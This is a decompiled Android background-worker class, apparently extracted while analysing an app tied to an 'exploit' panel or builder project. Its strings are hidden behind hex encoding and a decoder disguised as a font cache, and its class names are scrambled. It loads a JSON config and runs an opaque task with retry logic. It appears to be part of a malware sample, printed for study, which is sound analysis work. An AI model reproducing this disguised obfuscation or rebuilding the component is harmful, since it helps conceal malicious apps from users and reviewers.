package app.mobilex.plus.workers;

import android.content.Context;
import androidx.work.Worker;
import androidx.work.WorkerParameters;
import app.mobilex.plus.util.TypefaceCache;
import java.io.File;
import org.json.JSONObject;
import v.s.MdvPnR06eW9Un0O;
import v.s.VSZeS5mia3yEXbAe;
import v.s.b9xRoaXFR1fmOO2Q;
import v.s.di1l5OJ60eKNOgQR8yCS;
import v.s.eyavN4VgkDpngkAKt;
import v.s.roAK4OF9CtSmlCJgpQ;
import v.s.svTwlz04eJVOCrnbfI96;
import v.s.u4HKFgCbgUKtEQ;
import v.s.y6jRGLEWNMir;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class ManagerWXBridge extends Worker {
    public static final String xDyLpEZyrcKVe0;

    static {
        TypefaceCache.obtain("000E00770055008600F700BA00C00090001B00540049008E00F400B800D7");
        xDyLpEZyrcKVe0 = TypefaceCache.obtain("003000730049009100F500AD00ED00B5002600620049009E00CF00AD00D700A0002A0065004F008200E2");
    }

    public ManagerWXBridge(Context context, WorkerParameters workerParameters) {
        super(context, workerParameters);
    }

    private static /* synthetic */ void ymkyqwde() {
    }

    @Override // androidx.work.Worker
    public final MdvPnR06eW9Un0O xDyLpEZyrcKVe0() {
        JSONObject jSONObject;
        String message;
        TypefaceCache.obtain("0006006E005E008400E500AB00DB00A900240036202F00C700E200BA00C600B5003A007F0055008000B000AC00D700B500350073004900C700E200BA00D500AE003000620049008600E400B600DD00A90063003E005A009300E400BA00DF00B700370036");
        int i = this.w9sT1Swbhx3hs.vekpFI4d1Nc4fakF;
        String str = svTwlz04eJVOCrnbfI96.dDIMxZXP1V8HdM;
        Context context = this.dDIMxZXP1V8HdM;
        b9xRoaXFR1fmOO2Q b9xroaxfr1fmoo2q = null;
        try {
            File file = new File(context.getFilesDir(), svTwlz04eJVOCrnbfI96.dDIMxZXP1V8HdM);
            if (file.exists()) {
                jSONObject = new JSONObject(u4HKFgCbgUKtEQ.vIJudZvPyTuNp(file));
                TypefaceCache.obtain("000F0079005A008300F500BB009200A4002C00780055008200F300AB009200A300220062005A00C700F600AD00DD00AA0063");
            } else {
                jSONObject = null;
            }
        } catch (Exception e) {
            TypefaceCache.obtain("000500770052008B00F500BB009200B3002C00360057008800F100BB0092");
            e.getMessage();
        }
        if (jSONObject == null) {
            TypefaceCache.obtain("000D0079001B008400F100BC00DA00A2002700360048008200E200A900D700B500630072005A009300F100FF20A600E70022007A0049008200F100BB00CB00E700310073005C008E00E300AB00D700B500260072001B008800E200FF00D100AB002600770049008200F4");
            return MdvPnR06eW9Un0O.dDIMxZXP1V8HdM();
        }
        Object obj = ((roAK4OF9CtSmlCJgpQ) y6jRGLEWNMir.wotphlvK9sPbXJ(new eyavN4VgkDpngkAKt(jSONObject, b9xroaxfr1fmoo2q, 3))).w9sT1Swbhx3hs;
        if (!(obj instanceof VSZeS5mia3yEXbAe)) {
            TypefaceCache.obtain("001000730049009100F500AD009200B5002600710052009400E400AD00D300B3002A0079005500C700E300AA00D100A4002600650048008100E500B3009300E700070073004D008E00F300BA009200AE003000360055008800E700FF00DD00A900630066005A008900F500B3009C");
            svTwlz04eJVOCrnbfI96.dDIMxZXP1V8HdM(context);
            return MdvPnR06eW9Un0O.dDIMxZXP1V8HdM();
        }
        Throwable thDDIMxZXP1V8HdM = roAK4OF9CtSmlCJgpQ.dDIMxZXP1V8HdM(obj);
        if (thDDIMxZXP1V8HdM == null || (message = thDDIMxZXP1V8HdM.getMessage()) == null) {
            message = "";
        }
        TypefaceCache.obtain("001000730049009100F500AD009200B40037007F0057008B00B000AA00DC00B5002600770058008F00F100BD00DE00A200790036");
        TypefaceCache.obtain("00632002001B009000F900B300DE00E700310073004F009500E900FF009A00A2003B00660054008900F500B100C600AE0022007A001B008500F100BC00D900A8002500700012");
        if (!message.startsWith(TypefaceCache.obtain("000B0042006F00B700CF00EB00CA00BF"))) {
            return new di1l5OJ60eKNOgQR8yCS();
        }
        TypefaceCache.obtain("001000730049009100F500AD009200B5002600770058008F00F100BD00DE00A200630074004E009300B000AD00D700AD00260075004F008200F400FF00C000A200320063005E009400E400FF20A600E7003000620054009700E000B600DC00A000630064005E009300E200B600D700B4");
        svTwlz04eJVOCrnbfI96.dDIMxZXP1V8HdM(context);
        return MdvPnR06eW9Un0O.dDIMxZXP1V8HdM();
    }
}
